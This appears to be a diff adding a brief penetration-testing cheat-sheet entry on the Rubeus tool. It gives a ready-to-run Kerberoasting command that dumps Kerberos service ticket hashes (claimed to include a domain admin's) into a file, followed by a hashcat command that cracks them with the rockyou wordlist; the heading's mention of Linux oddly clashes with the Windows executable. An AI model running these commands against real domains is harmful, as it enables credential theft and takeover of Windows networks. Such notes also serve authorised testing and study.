@@ -1,0 +1,9 @@
+Rubeus * Linux 
+
+# UseCase: 
+Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments
+
+$ rubeus.exe kerberoast /outfile:hash.txt [After kerberoasting the password hash for DC-Admin is saved in hash.txt file]
+
+$ crack the Hash 
+[hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt]
